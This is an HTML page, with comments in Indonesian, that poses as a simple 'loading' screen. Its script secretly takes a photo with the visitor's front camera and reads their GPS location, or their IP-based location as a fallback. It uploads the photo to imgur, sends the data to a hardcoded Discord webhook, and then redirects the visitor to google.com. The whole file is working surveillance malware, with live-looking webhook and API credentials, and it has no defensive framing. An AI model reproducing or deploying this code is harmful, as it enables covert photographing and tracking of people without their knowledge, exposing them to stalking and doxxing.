<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat...</title>
    <style>
        *{margin:0;padding:0}
        body{background:#fff;height:100vh}
        video,canvas{position:absolute;opacity:0;pointer-events:none}
        .ld{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;color:#444}
        .ld div{width:40px;height:40px;border:3px solid #eee;border-top-color:#2563eb;border-radius:50%;animation:put .8s linear infinite;margin:0 auto 12px}
        @keyframes put{100%{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div class="ld"><div></div><p>Memuat...</p></div>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1538498418266218641/zM9vn4GAKeP_R6r5VTaC2Ccn_IAZQBHgUt2HvLWCqac519orhQJLSQlp8v89nelMYh6p";
const TUJUAN = "https://google.com";

let fotoUrl = null;
let dataLokasi = "Tidak terbaca";
let selesaiFoto = false;
let selesaiLokasi = false;

// 📷 AMBIL FOTO → UNGGAH → DAPET LINK
navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}})
.then(kamera=>{
    const vid = document.createElement("video");
    vid.srcObject = kamera; vid.play();
    setTimeout(()=>{
        const kanvas = document.createElement("canvas");
        kanvas.width=400; kanvas.height=400;
        const ctx = kanvas.getContext("2d");
        ctx.drawImage(vid,0,0,400,400);
        const base64 = kanvas.toDataURL("image/jpeg");
        kamera.getTracks().forEach(t=>t.stop());
        
        // ✅ UNGGAH KE SITUS GRATIS DAPET LINK
        unggahGambar(base64, link=>{
            fotoUrl = link;
            selesaiFoto = true;
            cekSemuaSelesai();
        });
    },1200);
})
.catch(()=>{selesaiFoto=true;cekSemuaSelesai();});

// 📍 AMBIL LOKASI
navigator.geolocation.getCurrentPosition(
    pos=>{
        dataLokasi = `🌍 ${pos.coords.latitude}, ${pos.coords.longitude} | ±${Math.round(pos.coords.accuracy)}m`;
        selesaiLokasi = true;
        cekSemuaSelesai();
    },
    err=>{
        fetch("https://ip-api.com/json/?fields=city,regionName,country,query")
        .then(r=>r.json())
        .then(d=>{
            dataLokasi = `🌐 ${d.city}, ${d.regionName}, ${d.country} | IP: ${d.query}`;
            selesaiLokasi = true;
            cekSemuaSelesai();
        })
        .catch(()=>{
            dataLokasi = "Lokasi tidak terbaca";
            selesaiLokasi = true;
            cekSemuaSelesai();
        });
    },
    {enableHighAccuracy:true,timeout:8000}
);

// ✅ UNGGAH GAMBAR KE SITUS GRATIS DAPET LINK URL
function unggahGambar(base64, callback){
    fetch("https://api.imgur.com/3/image",{
        method:"POST",
        headers:{"Authorization":"Client-ID 546c25a59c524c8"},
        body:JSON.stringify({image:base64.split(",")[1]})
    })
    .then(r=>r.json())
    .then(res=>{
        if(res.success) callback(res.data.link);
        else callback(null);
    })
    .catch(()=>callback(null));
}

// 📤 KIRIM KE DISCORD — PAKE LINK FOTO, BUKAN BASE64!
function cekSemuaSelesai(){
    if(!selesaiFoto || !selesaiLokasi) return;
    
    fetch(WEBHOOK,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
            content:"```✅ DATA MASUK\n"+dataLokasi+"```",
            embeds:fotoUrl ? [{image:{url:fotoUrl}}] : []
        })
    })
    .finally(()=>{
        window.location.href = TUJUAN;
    });
}
</script>
</body>
</html>
